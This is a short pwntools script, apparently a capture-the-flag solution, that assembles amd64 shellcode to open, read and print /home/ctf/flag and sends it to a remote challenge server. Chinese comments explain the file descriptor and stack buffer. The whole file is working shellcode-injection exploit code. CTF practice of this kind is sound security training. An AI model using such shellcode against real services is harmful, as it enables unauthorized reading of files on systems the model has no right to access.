#coding:utf-8
from pwn import *
# nc bamboofox.cs.nctu.edu.tw 11100
host="bamboofox.cs.nctu.edu.tw"
port=11101
flagfile="/home/ctf/flag"
context(arch="amd64")
fopen=shellcraft.open(flagfile,0,0)  #返回文件描述符号必定是3
fread=shellcraft.read(3,'rsp',0x60)  #把字符到栈上
write=shellcraft.write(1,'',0x60)

sc=fopen+fread+write
sc=asm(sc)


p=remote(host,port)
print p.recvuntil("here:")
p.send(sc)
print p.recvuntil("}")
# p.interactive()
